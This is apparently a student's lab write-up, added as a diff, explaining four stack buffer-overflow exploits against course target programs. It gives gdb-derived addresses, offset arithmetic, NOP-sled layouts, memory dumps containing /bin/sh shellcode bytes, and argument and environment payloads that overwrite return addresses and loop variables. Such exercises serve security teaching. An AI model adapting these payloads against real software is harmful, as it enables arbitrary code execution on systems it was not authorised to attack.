@@ -1,1 +1,205 @@
+Sploits1
+1. using the gdb (info frame) find the return address of the lab_main is stored at the address 0x2021fe88.
+2. using the gdb (p& buf) find the buf address is 0x2021fe10.
+3. 0x2021fe88 - 0x2021fe10 = 0x78 = 120
+4. 120 + 4(return address) = 124 
+5. 124 + ‘\0’ => the args[1] size is 125 byte.
+5. initializing the args[1] with 0x90 and then copy the shell code into it.
+6. we use ‘for(i = strlen(shellcode) + (4 - strlen(shellcode)%4); i < LEN - LEN%4; i+=4)’ to aline the shellcode and also write the rest of the args[1] with 19 return addresses.
+7. the result would looks like: (gdb) x/16xg 0x2021fe10
+        0x2021fe10: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x2021fe20: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x2021fe30: 0x622fffffffdce880 0x90909068732f6e69
+        0x2021fe40: 0x2021fe102021fe10 0x2021fe102021fe10
+        0x2021fe50: 0x2021fe102021fe10 0x2021fe102021fe10
+        0x2021fe60: 0x2021fe102021fe10 0x2021fe102021fe10
+        0x2021fe70: 0x2021fe102021fe10 0x2021fe102021fe10
+        0x2021fe80: 0x2021fe102021fe10 0x000000002021fe10
+8. small endian.
+9. the return address would be (0x2021fe8F)0x000000002021fe10(0x2021fe88).
+Vulnerability:
+(Buffer overflows)
+The string copy would not stop until ‘\0’ which means we can using string copy to change the return address of lab_main.
+Exploit:
+We use gdb find the the start address of buf and also the address that stores the lab_main return address. We modify the args[1].
+args[1]: (shellcode)+(0x909090)+(0x2021fe10 * 19times)+(0x00)
+The shellcode is in 0x000000002021fe10 and the return address was modified to 0x000000002021fe10.
 
+Sploits2
+1. using the gdb (info frame) find the return address of the foo is stored at the address 0x2021fe58.
+2. using the gdb (p& buf) find the buf address is 0x2021fd40.
+3. using the gdb (p& i) find the i address is 0x2021fe48.
+4. using the gdb (p& len) find the len address is 0x2021fe4c.
+5. from 0x2021fd40 to 0x2021fe47 size is 264
+6. 264 + 4(i) + 2(first part of len) + ‘\0’(second part of len) = 271 => args[1] size is 271
+7. env[0] should be the third part of len => env[0] size = 1 => env[0] would be an empty string with ‘\0’
+8. 0x2021fe58 - 0x2021fd40 = 0x118 = 280
+9. 280 + 4(return address) = 284
+10. 284 - 271 - 1 = 12 
+11. 12 + ‘\0’ => size of env[1] should be 13
+12. initializing the args[1] with 0x90 and then copy the shell code into it.
+13. at the end of the args[1] we add the i(fake) 0xXXXXXX0b and len(fake) 0x011c.
+14. when i iterate to 0x00000108(264) 0x08 would be over write to 0x0b => i would become 0x0000010b(267) => 0xXXXXXX would be jumped.
+15. in main
+        0x7fffffffd930: 0x2021fd402021fd40 0x00007f002021fd40
+        0x7fffffffd940: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x7fffffffd950: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x7fffffffd960: 0x622fffffffdce880 0x90909068732f6e69
+        0x7fffffffd970: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd980: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd990: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9a0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9b0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9c0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9d0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9e0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffd9f0: 0x9090909090909090 0x9090909090909090
+        0x7fffffffda00: 0x9090909090909090 0x9090909090909090
+        0x7fffffffda10: 0x9090909090909090 0x9090909090909090
+        0x7fffffffda20: 0x9090909090909090 0x9090909090909090
+        0x7fffffffda30: 0x9090909090909090 0x9090909090909090
+        0x7fffffffda40: 0x9090909090909090 0x0000011c9090900b
+        0x7fffffffda50: 0x0000000000400895 0x00007fffffffd930
+14. in lab_main
+        0x7fffffffeda6: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x7fffffffedb6: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x7fffffffedc6: 0x622fffffffdce880 0x90909068732f6e69
+        0x7fffffffedd6: 0x9090909090909090 0x9090909090909090
+        0x7fffffffede6: 0x9090909090909090 0x9090909090909090
+        0x7fffffffedf6: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee06: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee16: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee26: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee36: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee46: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee56: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee66: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee76: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee86: 0x9090909090909090 0x9090909090909090
+        0x7fffffffee96: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeea6: 0x9090909090909090 0x0000011c9090900b
+        0x7fffffffeeb6: 0x2021fd402021fd40 0x2f2e2e002021fd40
+15. because the ‘0x011c + \0’ of args[1], and ‘\0’ of env[0] the final changed len would be 0x0000011c(284) from 0x0000010e(270)
+16. the env[1] have the desired return address repeated 3 times and ‘\0’
+17. final buf
+        0x2021fd40: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x2021fd50: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x2021fd60: 0x622fffffffdce880 0x90909068732f6e69
+        0x2021fd70: 0x9090909090909090 0x9090909090909090
+        0x2021fd80: 0x9090909090909090 0x9090909090909090
+        0x2021fd90: 0x9090909090909090 0x9090909090909090
+        0x2021fda0: 0x9090909090909090 0x9090909090909090
+        0x2021fdb0: 0x9090909090909090 0x9090909090909090
+        0x2021fdc0: 0x9090909090909090 0x9090909090909090
+        0x2021fdd0: 0x9090909090909090 0x9090909090909090
+        0x2021fde0: 0x9090909090909090 0x9090909090909090
+        0x2021fdf0: 0x9090909090909090 0x9090909090909090
+        0x2021fe00: 0x9090909090909090 0x9090909090909090
+        0x2021fe10: 0x9090909090909090 0x9090909090909090
+        0x2021fe20: 0x9090909090909090 0x9090909090909090
+        0x2021fe30: 0x9090909090909090 0x9090909090909090
+        0x2021fe40: 0x9090909090909090 0x0000011c0000011d
+        0x2021fe50: 0x2021fd402021fd40 0x000000002021fd40
+Vulnerability:
+(Buffer overflows)
+The for loop in foo would not stop until i <= len.
+The address of i(0x2021fe48), len(0x2021fe4c), buf(0x2021fd40), and return(0x2021fe58), in foo, follow one by one.
+The buffer of args and env are connected in the stack.
+Exploit:
+args[1]: (shellcode)+(0x90 * 219times)+(0x0909090b)+(0x011c)+(0x00)
+env[0]: (0x00)
+env[1]: (0x2021fd40 * 3times) + (0x00)
+During the iteration when i=0x00000108(264) it was modified to i=0x0000010b(267), those three 0x09 in args[1] would be jumped.
+len was modified from 0x0000010e(270) to 0x0000011c(284).
+Based on the change of data i and len we finally changed the return address to the shellcode(0x2021fd40).
+
+Sploits3
+1. using the gdb (info frame) find the return address of the foo is stored at the address 0x2021fe58.
+2. using the gdb (p& buf) find the buf address is 0x2021fe10.
+3. it has sprints “AAAA” so that the shell code will start at 0x2021fe14
+4. 0x2021fe58 - 0x2021fe14 = 0x44 = 68
+5. 68 + 4(return address) = 72
+6. 72 + ‘0’ = 73 => args[1] size is 73
+7. initializing the args[1] with 0x90 and then copy the shell code into it.
+8. we use ‘for(i = strlen(shellcode) + (4 - strlen(shellcode)%4); i < LEN - LEN%4; i+=4)’ to aline the shellcode and also write the rest of the args[1] with 6 return addresses.
+7. the result would looks like: (gdb) x/10xg 0x2021fe10
+        0x2021fe10: 0x895e1feb41414141 0x89074688c0310876
+        0x2021fe20: 0x4e8df3890bb00c46 0xdb3180cd0c568d08
+        0x2021fe30: 0xffdce880cd40d889 0x732f6e69622fffff
+        0x2021fe40: 0x2021fe1490909068 0x2021fe142021fe14
+        0x2021fe50: 0x2021fe142021fe14 0x000000002021fe14
+Vulnerability:
+(Buffer overflows)
+The for loop in bar would not stop until rich the end of the arg which means we can overflow and change the return address of foo.
+Exploit:
+We use gdb find the the start address of buf and also the address that stores the foo return address. We modify the args[1].
+The buf address is 0x2021fe10 the shellcode would begin with 0x2021fe14 because of the sprintf of “AAAA”.
+args[1]: (shellcode)+(0x909090)+(0x2021fe14 * 6times)+(0x00)
+final buf: (“AAAA”)+(shellcode)+(0x909090)+(0x2021fe14 * 6times)+(0x00)
+The shellcode is in 0x000000002021fe14 and the return address was modified to 0x000000002021fe14.
+
+Sploits4
+1. using the gdb (info frame) find the return address of the foo is stored at the address 0x2021fe68.
+2. using the gdb (p& buf) find the buf address is 0x2021fdb0.
+3. using the gdb (p& i) find the i address is 0x2021fe5c.
+4. using the gdb (p& len) find the len address is 0x2021fe58.
+5. from 0x2021fdb0 to 0x2021fe57 size is 168
+6. 168 + 1(first part of len) + ‘\0’(second part of len) = 170 => args[1] size is 170
+7. 0x2021fe68 - 0x2021fdb0 = 0xb8 = 184
+8. 184 + 4(return address) = 188
+9. initializing the args[1] with 0x90 and then copy the shell code into it.
+10. at the end of the args[1] we add the one byte of the len.
+11. the one byte of len(0xbc)(188) and the end of the buf ‘0’ would be the first part of the len(0x00bc) 
+12. env[0] should be the third part of len => env[0] size = 1 => env[0] would be an empty string with ‘\0’
+13. env[1] should be the forth part of len => env[1] size = 1 => env[1] would be an empty string with ‘\0’
+14. env[2] should be the first part of i => env[2] size = 2 => env[2] would be 0xac’ and ‘\0’
+15. env[3] should be the second part of i => env[3] size = 1=> env[3] would be an empty string with ‘\0’
+16. env[4] should be the third part of i => env[4] size = 1=> env[4] would be an empty string with ‘\0’
+17. 188 - 170 - 1 - 1 - 2 - 1 - 1 = 12
+18. 12 + ‘\0’ = 13
+19. env[5] would set to return address that repeat 3 times 0x2021fdb0.
+20. for loop iterate to i=0x000000ac(172) which is the first byte of i (0xac) and we change it to 0xac again seems nothing happened.
+21 in main
+        0x7fffffffee6b: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x7fffffffee7b: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x7fffffffee8b: 0x622fffffffdce880 0x90909068732f6e69
+        0x7fffffffee9b: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeeab: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeebb: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeecb: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeedb: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeeeb: 0x9090909090909090 0x9090909090909090
+        0x7fffffffeefb: 0x9090909090909090 0x9090909090909090
+        0x7fffffffef0b: 0x9090909090909090 0x000000ac000000bc
+        0x7fffffffef1b: 0x2021fdb02021fdb0 0x2f2e2e002021fdb0
+
+22 buf
+        0x2021fdb0: 0xc0310876895e1feb 0x0bb00c4689074688
+        0x2021fdc0: 0x0c568d084e8df389 0xcd40d889db3180cd
+        0x2021fdd0: 0x622fffffffdce880 0x90909068732f6e69
+        0x2021fde0: 0x9090909090909090 0x9090909090909090
+        0x2021fdf0: 0x9090909090909090 0x9090909090909090
+        0x2021fe00: 0x9090909090909090 0x9090909090909090
+        0x2021fe10: 0x9090909090909090 0x9090909090909090
+        0x2021fe20: 0x9090909090909090 0x9090909090909090
+        0x2021fe30: 0x9090909090909090 0x9090909090909090
+        0x2021fe40: 0x9090909090909090 0x9090909090909090
+        0x2021fe50: 0x9090909090909090 0x000000bd000000bc
+        0x2021fe60: 0x2021fdb02021fdb0 0x000000002021fdb0
+
+Vulnerability:
+(Buffer overflows)
+The for loop in foo would not stop until i <= len.
+The address of i(0x2021fe5c), len(0x2021fe58), buf(0x2021fdb0), and return(0x2021fe68), in foo, follow one by one.
+The buffer of args and env are connected in the stack.
+Exploit:
+args[1]: (shellcode)+(0x90 * 123times)+(0xbc)+(0x00)
+env[0]: (0x00)
+env[1]: (0x00)
+env[2]: (0xac)+(0x00)
+env[3]: (0x00)
+env[4]: (0x00)
+env[5]: (0x2021fdb0 * 3times) + (0x00)
+During the iteration when i=0x000000ac(172) it was modified to i=0x000000ac(172) again seems nothing happened.
+len was modified from 0x000000a9(169) to 0x000000bc(188).
+Based on the change of data i and len we finally changed the return address to the shellcode(0x2021fdb0).
